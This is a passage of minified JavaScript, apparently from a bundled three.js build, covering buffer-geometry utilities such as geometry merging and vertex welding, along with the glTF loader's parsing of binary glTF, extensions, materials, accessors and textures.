n=p.x-d.x,a=f.x-d.x,s=p.y-d.y,l=f.y-d.y,u=p.z-d.z,x=f.z-d.z,b=_.x-m.x,w=g.x-m.x,T=_.y-m.y,S=g.y-m.y,M=1/(b*S-w*T);v.set((S*n-T*a)*M,(S*s-T*l)*M,(S*u-T*x)*M),y.set((b*a-w*n)*M,(b*l-w*s)*M,(b*x-w*u)*M),c[t].add(v),c[e].add(v),c[i].add(v),h[t].add(y),h[e].add(y),h[i].add(y)}function I(t){A.fromArray(a,3*t),P.copy(A),M=c[t],L.copy(M),L.sub(A.multiplyScalar(A.dot(M))).normalize(),k.crossVectors(P,M),E=k.dot(h[t]),S=E<0?-1:1,l[4*t]=L.x,l[4*t+1]=L.y,l[4*t+2]=L.z,l[4*t+3]=S}},mergeBufferGeometries:function(t,e){for(var i=null!==t[0].index,n=new Set(Object.keys(t[0].attributes)),r=new Set(Object.keys(t[0].morphAttributes)),a={},o={},s=new ii,l=0,c=0;c<t.length;++c){var h=t[c];if(i!==(null!==h.index))return null;for(var u in h.attributes){if(!n.has(u))return null;void 0===a[u]&&(a[u]=[]),a[u].push(h.attributes[u])}for(var u in h.morphAttributes){if(!r.has(u))return null;void 0===o[u]&&(o[u]=[]),o[u].push(h.morphAttributes[u])}if(s.userData.mergedUserData=s.userData.mergedUserData||[],s.userData.mergedUserData.push(h.userData),e){var d;if(i)d=h.index.count;else{if(void 0===h.attributes.position)return null;d=h.attributes.position.count}s.addGroup(l,d,c),l+=d}}if(i){var p=0,f=[];for(c=0;c<t.length;++c){for(var m=t[c].index,_=0;_<m.count;++_)f.push(m.getX(_)+p);p+=t[c].attributes.position.count}s.setIndex(f)}for(var u in a){var g=this.mergeBufferAttributes(a[u]);if(!g)return null;s.addAttribute(u,g)}for(var u in o){var v=o[u][0].length;if(0===v)break;for(s.morphAttributes=s.morphAttributes||{},s.morphAttributes[u]=[],c=0;c<v;++c){var y=[];for(_=0;_<o[u].length;++_)y.push(o[u][_][c]);var x=this.mergeBufferAttributes(y);if(!x)return null;s.morphAttributes[u].push(x)}}return s},mergeBufferAttributes:function(t){for(var e,i,n,r=0,a=0;a<t.length;++a){var o=t[a];if(o.isInterleavedBufferAttribute)return null;if(void 0===e&&(e=o.array.constructor),e!==o.array.constructor)return null;if(void 0===i&&(i=o.itemSize),i!==o.itemSize)return null;if(void 0===n&&(n=o.normalized),n!==o.normalized)return null;r+=o.array.length}var s=new e(r),l=0;for(a=0;a<t.length;++a)s.set(t[a].array,l),l+=t[a].array.length;return new We(s,i,n)},interleaveAttributes:function(t){for(var e,i=0,n=0,r=0,a=t.length;r<a;++r){var o=t[r];if(void 0===e&&(e=o.array.constructor),e!==o.array.constructor)return null;i+=o.array.length,n+=o.itemSize}var s=new Pr(new e(i),n),l=0,c=[],h=["getX","getY","getZ","getW"],u=["setX","setY","setZ","setW"],d=0;for(a=t.length;d<a;d++){var p=(o=t[d]).itemSize,f=o.count,m=new Or(s,p,l,o.normalized);c.push(m),l+=p;for(var _=0;_<f;_++)for(var g=0;g<p;g++)m[u[g]](_,o[h[g]](_))}return c},estimateBytesUsed:function(t){var e=0;for(var i in t.attributes){var n=t.getAttribute(i);e+=n.count*n.itemSize*n.array.BYTES_PER_ELEMENT}var r=t.getIndex();return e+(r?r.count*r.itemSize*r.array.BYTES_PER_ELEMENT:0)},mergeVertices:function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:1e-4;e=Math.max(e,Number.EPSILON);for(var i={},n=t.getIndex(),r=t.getAttribute("position"),a=n?n.count:r.count,o=0,s=Object.keys(t.attributes),l={},c={},h=[],u=["getX","getY","getZ","getW"],d=0,p=s.length;d<p;d++)l[b=s[d]]=[],(M=t.morphAttributes[b])&&(c[b]=new Array(M.length).fill().map((function(){return[]})));for(var f=Math.log10(1/e),m=Math.pow(10,f),_=0;_<a;_++){for(var g=n?n.getX(_):_,v="",y=0,x=s.length;y<x;y++)for(var b=s[y],w=(S=t.getAttribute(b)).itemSize,T=0;T<w;T++)v+="".concat(~~(S[u[T]](g)*m),",");if(v in i)h.push(i[v]);else{for(y=0,x=s.length;y<x;y++){b=s[y];var S=t.getAttribute(b),M=t.morphAttributes[b],E=(w=S.itemSize,l[b]),L=c[b];for(T=0;T<w;T++){var k=u[T];if(E.push(S[k](g)),M)for(var A=0,P=M.length;A<P;A++)L[A].push(M[A][k](g))}}i[v]=o,h.push(o),o++}}var O=t.clone();for(_=0,x=s.length;_<x;_++){b=s[_];var C=t.getAttribute(b),R=new C.array.constructor(l[b]);if(C.isInterleavedBufferAttribute?S=new We(R,C.itemSize,C.itemSize):(S=t.getAttribute(b).clone()).setArray(R),O.addAttribute(b,S),b in c)for(y=0;y<c[b].length;y++){var I=t.morphAttributes[b][y].clone();I.setArray(new I.array.constructor(c[b][y])),O.morphAttributes[b][y]=I}}var F=Uint8Array;h.length>=Math.pow(2,8)&&(F=Uint16Array),h.length>=Math.pow(2,16)&&(F=Uint32Array);var N=new F(h);return h=null,null===n?h=new We(N,1):(h=t.getIndex().clone()).setArray(N),O.setIndex(h),O}},Da=function(){function t(t){this.manager=void 0!==t?t:cr,this.dracoLoader=null}function e(){var t={};return{get:function(e){return t[e]},add:function(e,i){t[e]=i},remove:function(e){delete t[e]},removeAll:function(){t={}}}}t.prototype={constructor:t,crossOrigin:"anonymous",load:function(t,e,i,n){var r,a=this;r=void 0!==this.resourcePath?this.resourcePath:void 0!==this.path?this.path:Pa(t),a.manager.itemStart(t);var o=function(e){n&&n(e),a.manager.itemError(t),a.manager.itemEnd(t)},s=new _r(a.manager);s.setPath(this.path),s.setResponseType("arraybuffer"),s.load(t,(function(i){try{a.parse(i,r,(function(i){e(i),a.manager.itemEnd(t)}),o)}catch(t){o(t)}}),i,o)},setCrossOrigin:function(t){return this.crossOrigin=t,this},setPath:function(t){return this.path=t,this},setResourcePath:function(t){return this.resourcePath=t,this},setDRACOLoader:function(t){return this.dracoLoader=t,this},parse:function(t,e,s,l){var p,f={};if("string"==typeof t)p=t;else if(Aa(new Uint8Array(t,0,4))===o){try{f[i.KHR_BINARY_GLTF]=new c(t)}catch(t){return void(l&&l(t))}p=f[i.KHR_BINARY_GLTF].content}else p=Aa(new Uint8Array(t));var m=JSON.parse(p);if(void 0===m.asset||m.asset.version[0]<2)l&&l(new Error("GLTFLoader: Unsupported asset. glTF versions >=2.0 are supported. Use LegacyGLTFLoader instead."));else{if(m.extensionsUsed)for(var _=0;_<m.extensionsUsed.length;++_){var g=m.extensionsUsed[_],v=m.extensionsRequired||[];switch(g){case i.KHR_LIGHTS_PUNCTUAL:f[g]=new r(m);break;case i.KHR_MATERIALS_UNLIT:f[g]=new a(m);break;case i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS:f[g]=new d(m);break;case i.KHR_DRACO_MESH_COMPRESSION:f[g]=new h(m,this.dracoLoader);break;case i.MSFT_TEXTURE_DDS:f[i.MSFT_TEXTURE_DDS]=new n;break;case i.KHR_TEXTURE_TRANSFORM:f[i.KHR_TEXTURE_TRANSFORM]=new u(m);break;default:v.indexOf(g)}}var y=new P(m,f,{path:e||this.resourcePath||"",crossOrigin:this.crossOrigin,manager:this.manager});y.parse((function(t,e,i,n,r){var a={scene:t,scenes:e,cameras:i,animations:n,asset:r.asset,parser:y,userData:{}};T(f,a,r),s(a)}),l)}}};var i={KHR_BINARY_GLTF:"KHR_binary_glTF",KHR_DRACO_MESH_COMPRESSION:"KHR_draco_mesh_compression",KHR_LIGHTS_PUNCTUAL:"KHR_lights_punctual",KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS:"KHR_materials_pbrSpecularGlossiness",KHR_MATERIALS_UNLIT:"KHR_materials_unlit",KHR_TEXTURE_TRANSFORM:"KHR_texture_transform",MSFT_TEXTURE_DDS:"MSFT_texture_dds"};function n(){if(!br)throw new Error("GLTFLoader: Attempting to load .dds texture without importing DDSLoader");this.name=i.MSFT_TEXTURE_DDS,this.ddsLoader=new br}function r(t){this.name=i.KHR_LIGHTS_PUNCTUAL;var e=t.extensions&&t.extensions[i.KHR_LIGHTS_PUNCTUAL]||{};this.lightDefs=e.lights||[]}function a(t){this.name=i.KHR_MATERIALS_UNLIT}r.prototype.loadLight=function(t){var e,i=this.lightDefs[t],n=new be(16777215);void 0!==i.color&&n.fromArray(i.color);var r=void 0!==i.range?i.range:0;switch(i.type){case"directional":(e=new Mr(n)).target.position.set(0,0,-1),e.add(e.target);break;case"point":(e=new Er(n)).distance=r;break;case"spot":(e=new kr(n)).distance=r,i.spot=i.spot||{},i.spot.innerConeAngle=void 0!==i.spot.innerConeAngle?i.spot.innerConeAngle:0,i.spot.outerConeAngle=void 0!==i.spot.outerConeAngle?i.spot.outerConeAngle:Math.PI/4,e.angle=i.spot.outerConeAngle,e.penumbra=1-i.spot.innerConeAngle/i.spot.outerConeAngle,e.target.position.set(0,0,-1),e.add(e.target);break;default:throw new Error('GLTFLoader: Unexpected light type, "'+i.type+'".')}return e.position.set(0,0,0),e.decay=2,void 0!==i.intensity&&(e.intensity=i.intensity),e.name=i.name||"light_"+t,Promise.resolve(e)},a.prototype.getMaterialType=function(t){return Si},a.prototype.extendParams=function(t,e,i){var n=[];t.color=new be(1,1,1),t.opacity=1;var r=e.pbrMetallicRoughness;if(r){if(Array.isArray(r.baseColorFactor)){var a=r.baseColorFactor;t.color.fromArray(a),t.opacity=a[3]}void 0!==r.baseColorTexture&&n.push(i.assignTexture(t,"map",r.baseColorTexture))}return Promise.all(n)};var o="glTF",s=1313821514,l=5130562;function c(t){this.name=i.KHR_BINARY_GLTF,this.content=null,this.body=null;var e=new DataView(t,0,12);if(this.header={magic:Aa(new Uint8Array(t.slice(0,4))),version:e.getUint32(4,!0),length:e.getUint32(8,!0)},this.header.magic!==o)throw new Error("GLTFLoader: Unsupported glTF-Binary header.");if(this.header.version<2)throw new Error("GLTFLoader: Legacy binary file detected. Use LegacyGLTFLoader instead.");for(var n=new DataView(t,12),r=0;r<n.byteLength;){var a=n.getUint32(r,!0);r+=4;var c=n.getUint32(r,!0);if(r+=4,c===s){var h=new Uint8Array(t,12+r,a);this.content=Aa(h)}else if(c===l){var u=12+r;this.body=t.slice(u,u+a)}r+=a}if(null===this.content)throw new Error("GLTFLoader: JSON content not found.")}function h(t,e){if(!e)throw new Error("GLTFLoader: No DRACOLoader instance provided.");this.name=i.KHR_DRACO_MESH_COMPRESSION,this.json=t,this.dracoLoader=e,DRACOLoader.getDecoderModule()}function u(t){this.name=i.KHR_TEXTURE_TRANSFORM}function d(){return{name:i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS,specularGlossinessParams:["color","map","lightMap","lightMapIntensity","aoMap","aoMapIntensity","emissive","emissiveIntensity","emissiveMap","bumpMap","bumpScale","normalMap","displacementMap","displacementScale","displacementBias","specularMap","specular","glossinessMap","glossiness","alphaMap","envMap","envMapIntensity","refractionRatio"],getMaterialType:function(){return bi},extendParams:function(t,e,i){var n=e.extensions[this.name],r=Le.standard,a=Ee.clone(r.uniforms),o=["#ifdef USE_SPECULARMAP","\tuniform sampler2D specularMap;","#endif"].join("\n"),s=["#ifdef USE_GLOSSINESSMAP","\tuniform sampler2D glossinessMap;","#endif"].join("\n"),l=["vec3 specularFactor = specular;","#ifdef USE_SPECULARMAP","\tvec4 texelSpecular = texture2D( specularMap, vUv );","\ttexelSpecular = sRGBToLinear( texelSpecular );","\t// reads channel RGB, compatible with a glTF Specular-Glossiness (RGBA) texture","\tspecularFactor *= texelSpecular.rgb;","#endif"].join("\n"),c=["float glossinessFactor = glossiness;","#ifdef USE_GLOSSINESSMAP","\tvec4 texelGlossiness = texture2D( glossinessMap, vUv );","\t// reads channel A, compatible with a glTF Specular-Glossiness (RGBA) texture","\tglossinessFactor *= texelGlossiness.a;","#endif"].join("\n"),h=["PhysicalMaterial material;","material.diffuseColor = diffuseColor.rgb;","material.specularRoughness = clamp( 1.0 - glossinessFactor, 0.04, 1.0 );","material.specularColor = specularFactor.rgb;"].join("\n"),u=r.fragmentShader.replace("uniform float roughness;","uniform vec3 specular;").replace("uniform float metalness;","uniform float glossiness;").replace("#include <roughnessmap_pars_fragment>",o).replace("#include <metalnessmap_pars_fragment>",s).replace("#include <roughnessmap_fragment>",l).replace("#include <metalnessmap_fragment>",c).replace("#include <lights_physical_fragment>",h);delete a.roughness,delete a.metalness,delete a.roughnessMap,delete a.metalnessMap,a.specular={value:(new be).setHex(1118481)},a.glossiness={value:.5},a.specularMap={value:null},a.glossinessMap={value:null},t.vertexShader=r.vertexShader,t.fragmentShader=u,t.uniforms=a,t.defines={STANDARD:""},t.color=new be(1,1,1),t.opacity=1;var d=[];if(Array.isArray(n.diffuseFactor)){var p=n.diffuseFactor;t.color.fromArray(p),t.opacity=p[3]}if(void 0!==n.diffuseTexture&&d.push(i.assignTexture(t,"map",n.diffuseTexture)),t.emissive=new be(0,0,0),t.glossiness=void 0!==n.glossinessFactor?n.glossinessFactor:1,t.specular=new be(1,1,1),Array.isArray(n.specularFactor)&&t.specular.fromArray(n.specularFactor),void 0!==n.specularGlossinessTexture){var f=n.specularGlossinessTexture;d.push(i.assignTexture(t,"glossinessMap",f)),d.push(i.assignTexture(t,"specularMap",f))}return Promise.all(d)},createMaterial:function(t){var e=new bi({defines:t.defines,vertexShader:t.vertexShader,fragmentShader:t.fragmentShader,uniforms:t.uniforms,fog:!0,lights:!0,opacity:t.opacity,transparent:t.transparent});return e.isGLTFSpecularGlossinessMaterial=!0,e.color=t.color,e.map=void 0===t.map?null:t.map,e.lightMap=null,e.lightMapIntensity=1,e.aoMap=void 0===t.aoMap?null:t.aoMap,e.aoMapIntensity=1,e.emissive=t.emissive,e.emissiveIntensity=1,e.emissiveMap=void 0===t.emissiveMap?null:t.emissiveMap,e.bumpMap=void 0===t.bumpMap?null:t.bumpMap,e.bumpScale=1,e.normalMap=void 0===t.normalMap?null:t.normalMap,t.normalScale&&(e.normalScale=t.normalScale),e.displacementMap=null,e.displacementScale=1,e.displacementBias=0,e.specularMap=void 0===t.specularMap?null:t.specularMap,e.specular=t.specular,e.glossinessMap=void 0===t.glossinessMap?null:t.glossinessMap,e.glossiness=t.glossiness,e.alphaMap=null,e.envMap=void 0===t.envMap?null:t.envMap,e.envMapIntensity=1,e.refractionRatio=.98,e.extensions.derivatives=!0,e},cloneMaterial:function(t){var e=t.clone();e.isGLTFSpecularGlossinessMaterial=!0;for(var i=this.specularGlossinessParams,n=0,r=i.length;n<r;n++)e[i[n]]=t[i[n]];return e},refreshUniforms:function(t,e,i,n,r,a){if(!0===r.isGLTFSpecularGlossinessMaterial){var o,s=r.uniforms,l=r.defines;s.opacity.value=r.opacity,s.diffuse.value.copy(r.color),s.emissive.value.copy(r.emissive).multiplyScalar(r.emissiveIntensity),s.map.value=r.map,s.specularMap.value=r.specularMap,s.alphaMap.value=r.alphaMap,s.lightMap.value=r.lightMap,s.lightMapIntensity.value=r.lightMapIntensity,s.aoMap.value=r.aoMap,s.aoMapIntensity.value=r.aoMapIntensity,r.map?o=r.map:r.specularMap?o=r.specularMap:r.displacementMap?o=r.displacementMap:r.normalMap?o=r.normalMap:r.bumpMap?o=r.bumpMap:r.glossinessMap?o=r.glossinessMap:r.alphaMap?o=r.alphaMap:r.emissiveMap&&(o=r.emissiveMap),void 0!==o&&(o.isWebGLRenderTarget&&(o=o.texture),!0===o.matrixAutoUpdate&&o.updateMatrix(),s.uvTransform.value.copy(o.matrix)),r.envMap&&(s.envMap.value=r.envMap,s.envMapIntensity.value=r.envMapIntensity,s.flipEnvMap.value=r.envMap.isCubeTexture?-1:1,s.reflectivity.value=r.reflectivity,s.refractionRatio.value=r.refractionRatio,s.maxMipLevel.value=t.properties.get(r.envMap).__maxMipLevel),s.specular.value.copy(r.specular),s.glossiness.value=r.glossiness,s.glossinessMap.value=r.glossinessMap,s.emissiveMap.value=r.emissiveMap,s.bumpMap.value=r.bumpMap,s.normalMap.value=r.normalMap,s.displacementMap.value=r.displacementMap,s.displacementScale.value=r.displacementScale,s.displacementBias.value=r.displacementBias,null!==s.glossinessMap.value&&void 0===l.USE_GLOSSINESSMAP&&(l.USE_GLOSSINESSMAP="",l.USE_ROUGHNESSMAP=""),null===s.glossinessMap.value&&void 0!==l.USE_GLOSSINESSMAP&&(delete l.USE_GLOSSINESSMAP,delete l.USE_ROUGHNESSMAP)}}}}function p(t,e,i,n){fr.call(this,t,e,i,n)}h.prototype.decodePrimitive=function(t,e){var i=this.json,n=this.dracoLoader,r=t.extensions[this.name].bufferView,a=t.extensions[this.name].attributes,o={},s={},l={};for(var c in a)c in v&&(o[v[c]]=a[c]);for(c in t.attributes)if(void 0!==v[c]&&void 0!==a[c]){var h=i.accessors[t.attributes[c]],u=f[h.componentType];l[v[c]]=u,s[v[c]]=!0===h.normalized}return e.getDependency("bufferView",r).then((function(t){return new Promise((function(e){n.decodeDracoFile(t,(function(t){for(var i in t.attributes){var n=t.attributes[i],r=s[i];void 0!==r&&(n.normalized=r)}e(t)}),o,l)}))}))},u.prototype.extendTexture=function(t,e){return t=t.clone(),void 0!==e.offset&&t.offset.fromArray(e.offset),void 0!==e.rotation&&(t.rotation=e.rotation),void 0!==e.scale&&t.repeat.fromArray(e.scale),e.texCoord,t.needsUpdate=!0,t},p.prototype=Object.create(fr.prototype),p.prototype.constructor=p,p.prototype.copySampleValue_=function(t){for(var e=this.resultBuffer,i=this.sampleValues,n=this.valueSize,r=t*n*3+n,a=0;a!==n;a++)e[a]=i[r+a];return e},p.prototype.beforeStart_=p.prototype.copySampleValue_,p.prototype.afterEnd_=p.prototype.copySampleValue_,p.prototype.interpolate_=function(t,e,i,n){for(var r=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=2*o,l=3*o,c=n-e,h=(i-e)/c,u=h*h,d=u*h,p=t*l,f=p-l,m=-2*d+3*u,_=d-u,g=1-m,v=_-u+h,y=0;y!==o;y++){var x=a[f+y+o],b=a[f+y+s]*c,w=a[p+y+o],T=a[p+y]*c;r[y]=g*x+v*b+m*w+_*T}return r};var f={5120:Int8Array,5121:Uint8Array,5122:Int16Array,5123:Uint16Array,5125:Uint32Array,5126:Float32Array},m={9728:Pt,9729:Rt,9984:Ot,9985:1007,9986:Ct,9987:It},_={33071:kt,33648:At,10497:Lt},g={SCALAR:1,VEC2:2,VEC3:3,VEC4:4,MAT2:4,MAT3:9,MAT4:16},v={POSITION:"position",NORMAL:"normal",TANGENT:"tangent",TEXCOORD_0:"uv",TEXCOORD_1:"uv2",COLOR_0:"color",WEIGHTS_0:"skinWeight",JOINTS_0:"skinIndex"},y={scale:"scale",translation:"position",rotation:"quaternion",weights:"morphTargetInfluences"},x={CUBICSPLINE:2302,LINEAR:2301,STEP:2300},b={"image/png":Bt,"image/jpeg":Ut};function w(t,e){return"string"!=typeof t||""===t?"":/^(https?:)?\/\//i.test(t)||/^data:.*,.*$/i.test(t)||/^blob:.*$/i.test(t)?t:e+t}function T(t,e,i){for(var n in i.extensions)void 0===t[n]&&(e.userData.gltfExtensions=e.userData.gltfExtensions||{},e.userData.gltfExtensions[n]=i.extensions[n])}function S(t,e){void 0!==e.extras&&"object"===Object(pr.a)(e.extras)&&(t.userData=e.extras)}function M(t,e){if(t.updateMorphTargets(),void 0!==e.weights)for(var i=0,n=e.weights.length;i<n;i++)t.morphTargetInfluences[i]=e.weights[i];if(e.extras&&Array.isArray(e.extras.targetNames)){var r=e.extras.targetNames;if(t.morphTargetInfluences.length===r.length)for(t.morphTargetDictionary={},i=0,n=r.length;i<n;i++)t.morphTargetDictionary[r[i]]=i}}function E(t,e){if(Object.keys(t).length!==Object.keys(e).length)return!1;for(var i in t)if(t[i]!==e[i])return!1;return!0}function L(t){var e=t.extensions&&t.extensions[i.KHR_DRACO_MESH_COMPRESSION];return e?"draco:"+e.bufferView+":"+e.indices+":"+k(e.attributes):t.indices+":"+k(t.attributes)+":"+t.mode}function k(t){for(var e="",i=Object.keys(t).sort(),n=0,r=i.length;n<r;n++)e+=i[n]+":"+t[i[n]]+";";return e}function A(t){if(t.isInterleavedBufferAttribute){for(var e=t.count,i=t.itemSize,n=t.array.slice(0,e*i),r=0,a=0;r<e;++r)n[a++]=t.getX(r),i>=2&&(n[a++]=t.getY(r)),i>=3&&(n[a++]=t.getZ(r)),i>=4&&(n[a++]=t.getW(r));return new We(n,i,t.normalized)}return t.clone()}function P(t,i,n){this.json=t||{},this.extensions=i||{},this.options=n||{},this.cache=new e,this.primitiveCache={},this.multiplePrimitivesCache={},this.multiPassGeometryCache={},this.textureLoader=new dr(this.options.manager),this.textureLoader.setCrossOrigin(this.options.crossOrigin),this.fileLoader=new _r(this.options.manager),this.fileLoader.setResponseType("arraybuffer")}function O(t,e,i){var n=e.attributes,r=[];function a(e,n){return i.getDependency("accessor",e).then((function(e){t.addAttribute(n,e)}))}for(var o in n){var s=v[o];s&&(s in t.attributes||r.push(a(n[o],s)))}if(void 0!==e.indices&&!t.index){var l=i.getDependency("accessor",e.indices).then((function(e){t.setIndex(e)}));r.push(l)}return S(t,e),Promise.all(r).then((function(){return void 0!==e.targets?function(t,e,i){for(var n=!1,r=!1,a=0,o=e.length;a<o&&(void 0!==(c=e[a]).POSITION&&(n=!0),void 0!==c.NORMAL&&(r=!0),!n||!r);a++);if(!n&&!r)return Promise.resolve(t);var s=[],l=[];for(a=0,o=e.length;a<o;a++){var c=e[a];if(n){var h=void 0!==c.POSITION?i.getDependency("accessor",c.POSITION).then((function(t){return A(t)})):t.attributes.position;s.push(h)}r&&(h=void 0!==c.NORMAL?i.getDependency("accessor",c.NORMAL).then((function(t){return A(t)})):t.attributes.normal,l.push(h))}return Promise.all([Promise.all(s),Promise.all(l)]).then((function(i){for(var a=i[0],o=i[1],s=0,l=e.length;s<l;s++){var c=e[s],h="morphTarget"+s;if(n&&void 0!==c.POSITION){var u=a[s];u.name=h;for(var d=t.attributes.position,p=0,f=u.count;p<f;p++)u.setXYZ(p,u.getX(p)+d.getX(p),u.getY(p)+d.getY(p),u.getZ(p)+d.getZ(p))}if(r&&void 0!==c.NORMAL){var m=o[s];m.name=h;var _=t.attributes.normal;for(p=0,f=m.count;p<f;p++)m.setXYZ(p,m.getX(p)+_.getX(p),m.getY(p)+_.getY(p),m.getZ(p)+_.getZ(p))}}return n&&(t.morphAttributes.position=a),r&&(t.morphAttributes.normal=o),t}))}(t,e.targets,i):t}))}return P.prototype.parse=function(t,e){var i=this.json;this.cache.removeAll(),this.markDefs(),this.getMultiDependencies(["scene","animation","camera"]).then((function(e){var n=e.scenes||[],r=n[i.scene||0],a=e.animations||[],o=e.cameras||[];t(r,n,o,a,i)})).catch(e)},P.prototype.markDefs=function(){for(var t=this.json.nodes||[],e=this.json.skins||[],i=this.json.meshes||[],n={},r={},a=0,o=e.length;a<o;a++)for(var s=e[a].joints,l=0,c=s.length;l<c;l++)t[s[l]].isBone=!0;for(var h=0,u=t.length;h<u;h++){var d=t[h];void 0!==d.mesh&&(void 0===n[d.mesh]&&(n[d.mesh]=r[d.mesh]=0),n[d.mesh]++,void 0!==d.skin&&(i[d.mesh].isSkinnedMesh=!0))}this.json.meshReferences=n,this.json.meshUses=r},P.prototype.getDependency=function(t,e){var n=t+":"+e,r=this.cache.get(n);if(!r){switch(t){case"scene":r=this.loadScene(e);break;case"node":r=this.loadNode(e);break;case"mesh":r=this.loadMesh(e);break;case"accessor":r=this.loadAccessor(e);break;case"bufferView":r=this.loadBufferView(e);break;case"buffer":r=this.loadBuffer(e);break;case"material":r=this.loadMaterial(e);break;case"texture":r=this.loadTexture(e);break;case"skin":r=this.loadSkin(e);break;case"animation":r=this.loadAnimation(e);break;case"camera":r=this.loadCamera(e);break;case"light":r=this.extensions[i.KHR_LIGHTS_PUNCTUAL].loadLight(e);break;default:throw new Error("Unknown type: "+t)}this.cache.add(n,r)}return r},P.prototype.getDependencies=function(t){var e=this.cache.get(t);if(!e){var i=this,n=this.json[t+("mesh"===t?"es":"s")]||[];e=Promise.all(n.map((function(e,n){return i.getDependency(t,n)}))),this.cache.add(t,e)}return e},P.prototype.getMultiDependencies=function(t){for(var e={},i=[],n=0,r=t.length;n<r;n++){var a=t[n],o=this.getDependencies(a);o=o.then(function(t,i){e[t]=i}.bind(this,a+("mesh"===a?"es":"s"))),i.push(o)}return Promise.all(i).then((function(){return e}))},P.prototype.loadBuffer=function(t){var e=this.json.buffers[t],n=this.fileLoader;if(e.type&&"arraybuffer"!==e.type)throw new Error("GLTFLoader: "+e.type+" buffer type is not supported.");if(void 0===e.uri&&0===t)return Promise.resolve(this.extensions[i.KHR_BINARY_GLTF].body);var r=this.options;return new Promise((function(t,i){n.load(w(e.uri,r.path),t,void 0,(function(){i(new Error('GLTFLoader: Failed to load buffer "'+e.uri+'".'))}))}))},P.prototype.loadBufferView=function(t){var e=this.json.bufferViews[t];return this.getDependency("buffer",e.buffer).then((function(t){var i=e.byteLength||0,n=e.byteOffset||0;return t.slice(n,n+i)}))},P.prototype.loadAccessor=function(t){var e=this,i=this.json,n=this.json.accessors[t];if(void 0===n.bufferView&&void 0===n.sparse)return Promise.resolve(null);var r=[];return void 0!==n.bufferView?r.push(this.getDependency("bufferView",n.bufferView)):r.push(null),void 0!==n.sparse&&(r.push(this.getDependency("bufferView",n.sparse.indices.bufferView)),r.push(this.getDependency("bufferView",n.sparse.values.bufferView))),Promise.all(r).then((function(t){var r,a=t[0],o=g[n.type],s=f[n.componentType],l=s.BYTES_PER_ELEMENT,c=l*o,h=n.byteOffset||0,u=void 0!==n.bufferView?i.bufferViews[n.bufferView].byteStride:void 0,d=!0===n.normalized;if(u&&u!==c){var p="InterleavedBuffer:"+n.bufferView+":"+n.componentType,m=e.cache.get(p);m||(m=new Pr(new s(a),u/l),e.cache.add(p,m)),r=new Or(m,o,h/l,d)}else r=new We(null===a?new s(n.count*o):new s(a,h,n.count*o),o,d);if(void 0!==n.sparse){var _=g.SCALAR,v=f[n.sparse.indices.componentType],y=n.sparse.indices.byteOffset||0,x=n.sparse.values.byteOffset||0,b=new v(t[1],y,n.sparse.count*_),w=new s(t[2],x,n.sparse.count*o);null!==a&&r.setArray(r.array.slice());for(var T=0,S=b.length;T<S;T++){var M=b[T];if(r.setX(M,w[T*o]),o>=2&&r.setY(M,w[T*o+1]),o>=3&&r.setZ(M,w[T*o+2]),o>=4&&r.setW(M,w[T*o+3]),o>=5)throw new Error("GLTFLoader: Unsupported itemSize in sparse BufferAttribute.")}}return r}))},P.prototype.loadTexture=function(t){var e,n=this,r=this.json,a=this.options,o=this.textureLoader,s=window.URL||window.webkitURL,l=r.textures[t],c=l.extensions||{},h=(e=c[i.MSFT_TEXTURE_DDS]?r.images[c[i.MSFT_TEXTURE_DDS].source]:r.images[l.source]).uri,u=!1;return void 0!==e.bufferView&&(h=n.getDependency("bufferView",e.bufferView).then((function(t){u=!0;var i=new Blob([t],{type:e.mimeType});return h=s.createObjectURL(i)}))),Promise.resolve(h).then((function(t){var e=ya.Handlers.get(t);return e||(e=c[i.MSFT_TEXTURE_DDS]?n.extensions[i.MSFT_TEXTURE_DDS].ddsLoader:o),new Promise((function(i,n){e.load(w(t,a.path),i,void 0,n)}))})).then((function(t){!0===u&&s.revokeObjectURL(h),t.flipY=!1,void 0!==l.name&&(t.name=l.name),e.mimeType in b&&(t.format=b[e.mimeType]);var i=(r.samplers||{})[l.sampler]||{};return t.magFilter=m[i.magFilter]||Rt,t.minFilter=m[i.minFilter]||It,t.wrapS=_[i.wrapS]||Lt,t.wrapT=_[i.wrapT]||Lt,t}))},P.prototype.assignTexture=function(t,e,n){var r=this;return this.getDependency("texture",n.index).then((function(a){switch(e){case"aoMap":case"emissiveMap":case"metalnessMap":case"normalMap":case"roughnessMap":a.format=Ut}if(r.extensions[i.KHR_TEXTURE_TRANSFORM]){var o=void 0!==n.extensions?n.extensions[i.KHR_TEXTURE_TRANSFORM]:void 0;o&&(a=r.extensions[i.KHR_TEXTURE_TRANSFORM].extendTexture(a,o))}t[e]=a}))},P.prototype.loadMaterial=function(t){var e,n=this.json,r=this.extensions,a=n.materials[t],o={},s=a.extensions||{},l=[];if(s[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS]){var c=r[i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS];e=c.getMaterialType(a),l.push(c.extendParams(o,a,this))}else if(s[i.KHR_MATERIALS_UNLIT]){var h=r[i.KHR_MATERIALS_UNLIT];e=h.getMaterialType(a),l.push(h.extendParams(o,a,this))}else{e=Ar;var u=a.pbrMetallicRoughness||{};if(o.color=new be(1,1,1),o.opacity=1,Array.isArray(u.baseColorFactor)){var d=u.baseColorFactor;o.color.fromArray(d),o.opacity=d[3]}void 0!==u.baseColorTexture&&l.push(this.assignTexture(o,"map",u.baseColorTexture)),o.metalness=void 0!==u.metallicFactor?u.metallicFactor:1,o.roughness=void 0!==u.roughnessFactor?u.roughnessFactor:1,void 0!==u.metallicRoughnessTexture&&(l.push(this.assignTexture(o,"metalnessMap",u.metallicRoughnessTexture)),l.push(this.assignTexture(o,"roughnessMap",u.metallicRoughnessTexture)))}!0===a.doubleSided&&(o.side=2);var p=a.alphaMode||"OPAQUE";return"BLEND"===p?o.transparent=!0:(o.transparent=!1,"MASK"===p&&(o.alphaTest=void 0!==a.alphaCutoff?a.alphaCutoff:.5)),void 0!==a.normalTexture&&e!==Si&&(l.push(this.assignTexture(o,"normalMap",a.normalTexture)),o.normalScale=new Jt(1,1),void 0!==a.normalTexture.scale&&o.normalScale.set(a.normalTexture.scale,a.normalTexture.scale)),void 0!==a.occlusionTexture&&e!==Si&&(l.push(this.assignTexture(o,"aoMap",a.occlusionTexture)),void 